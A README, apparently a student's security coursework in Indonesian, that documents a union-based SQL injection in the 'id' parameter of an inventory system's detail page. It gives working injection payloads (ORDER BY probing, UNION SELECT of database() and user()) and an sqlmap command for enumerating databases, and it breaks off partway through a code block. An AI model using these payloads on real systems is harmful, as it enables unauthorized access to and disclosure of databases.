# Exploitation of SQL Injection: Workshop Inventory Management System

**Nama:** Haris Adriansyah  
**NIM:** 312410286  
**Kelas:** TI.24.A.1  
**Matkul:** Pemrograman Web  
**Dosen:** Agung Nugroho, S.Kom., M.Kom.

![Security](https://img.shields.io/badge/Security-Penetration%20Testing-red)
![License](https://img.shields.io/badge/License-MIT-blue)

Repository ini berisi dokumentasi teknis mengenai temuan kerentanan **SQL Injection (SQLi)** pada Sistem Manajemen Inventaris Bengkel Jaya.

---

## 📝 Deskripsi Proyek
Sistem ini memiliki celah keamanan pada parameter input yang tidak difilter, memungkinkan eksekusi perintah SQL berbahaya.

## 🔍 Temuan Kerentanan
- **Vulnerability Type**: SQL Injection (Union Based)
- **Affected Component**: Parameter `id` pada `detail_barang.php`.
- **Impact**: Database Disclosure.

---

## 🚀 Proof of Concept (PoC)

### 1. Manual Injection
Langkah awal untuk menentukan jumlah kolom dan ekstraksi data dasar.

* **Cek Kolom:** `' ORDER BY 5-- -`
* **Ekstraksi Data:** `' UNION SELECT 1,2,database(),user(),5-- -`

![Manual Injection](img/hasil-manual.png)

### 2. Automated with SQLMap
Penggunaan alat otomatis untuk efisiensi ekstraksi data database secara menyeluruh.

**A. Enumerasi Database:**
```text
sqlmap -u [http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1) --batch --dbs
